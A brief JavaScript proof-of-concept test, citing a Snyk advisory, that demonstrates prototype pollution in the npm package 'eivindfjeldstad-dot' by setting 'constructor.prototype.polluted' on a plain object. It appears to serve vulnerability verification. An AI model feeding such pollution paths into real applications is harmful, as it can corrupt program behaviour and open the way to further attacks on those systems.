// //https://security.snyk.io/vuln/SNYK-JS-EIVINDFJELDSTADDOT-564434
// test("prototype pollution in eivindfjeldstad-dot", () => {
  const a = require("eivindfjeldstad-dot");

console.log({}.polluted);
let path = "constructor.prototype.polluted";
  //let path = "__proto__.polluted";
  a.set({}, path, "yes");

console.log({}.polluted);
// });
